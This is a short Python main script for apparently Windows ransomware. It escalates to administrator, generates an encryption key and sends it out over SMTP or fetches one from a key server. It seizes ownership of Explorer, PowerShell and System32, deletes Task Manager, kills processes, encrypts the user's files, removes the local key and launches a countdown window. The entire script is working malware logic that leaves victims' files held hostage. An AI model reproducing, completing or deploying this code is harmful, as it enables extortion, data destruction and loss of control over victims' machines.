#!/usr/bin/python
#coding:utf-8
from tkinter import *
from timeit import default_timer
import tkinter as tk
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, delproc, regedit
from modules.network import host_connect, sendkey_smtp, keyserver
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time

x = os.path.isdir("\\PerfLogs\\gui_counter")
def copy_counter():
        cpath = os.getcwd()
        src = "%s\setup\gui_counter" %(cpath)
        dst = "\\PerfLogs\\gui_counter"
        cpy = shutil.copytree(src, dst)

usr = os.environ["USERNAME"]
if(get_admin_rights.is_admin()):
    if host_connect.keyrcv():
        keyserver.getcrypt()
    else:
        crypt.genkey(usr)
        sendkey_smtp.send_key()
        takeown.process()
        takeown.perf()
        takeown.exp()
        icacls.perf()
        if(x):
            pass
        else:
            copy_counter()
        icacls.perfall()
        regedit.setRef()
        icacls.exp()
        icacls.pshll()
        icacls.sys32()
        delproc.tskmgr()
        killproc.smart()
        delproc.smart()
        crypt.filelist()
        killproc.exp()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)

path = os.getcwd()
try:
    rkey = "%s\\%s.key" %(path, usr)
    os.remove(rkey)
except:
    pass
# Run the GUI Counter
gcount = "\\PerfLogs\\gui_counter\\gui_counter.exe"
os.system(gcount)
